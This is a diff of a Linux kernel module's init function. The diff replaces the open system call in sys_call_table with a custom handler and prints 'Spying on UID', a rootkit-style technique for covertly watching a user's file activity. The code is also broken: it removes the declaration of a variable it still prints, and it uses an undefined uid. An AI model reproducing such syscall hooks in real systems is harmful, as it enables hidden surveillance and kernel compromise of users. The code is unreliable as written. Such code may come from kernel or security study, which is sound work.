@@ -1,17 +1,20 @@
-#include "helper.h"
+#include "syscall.h"
 
-#define DRIVER_AUTHOR "Brad Hacker"
-#define DRIVER_DESC "drivermode"
+#define DRIVER_AUTHOR "kindtime"
+#define DRIVER_DESC "kindtime"
 
 static int __init hello_init(void)
 {
-	int variable;
-
-	printk(KERN_ALERT "evan is %s %p \n", evan, &evan);
 	pr_info("hello from pr info\n");
-	variable = truth();
 	printk(KERN_ALERT "return val %d\n", variable);
-	printk(KERN_ALERT "testing\n");
+
+	original_call = sys_call_table[__NR_open];
+  	sys_call_table[__NR_open] = our_sys_open;
+
+	printk("Spying on UID:%d\n", uid);
+
+	getuid_call = sys_call_table[__NR_getuid];
+
 	return 0;
 }
 
